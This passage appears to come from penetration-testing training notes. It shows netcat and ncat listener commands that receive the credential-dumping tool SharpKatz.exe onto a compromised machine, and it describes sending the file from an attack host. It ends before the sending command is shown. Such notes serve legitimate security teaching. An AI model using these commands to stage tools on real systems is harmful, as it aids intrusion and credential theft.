## Netcat
## File Transfer with Netcat and Ncat
#### NetCat - Compromised Machine - Listening on Port 8000

```shell-session
$ nc -l -p 8000 > SharpKatz.exe
```
If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.
#### Ncat - Compromised Machine - Listening on Port 8000
```shell-session
$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.
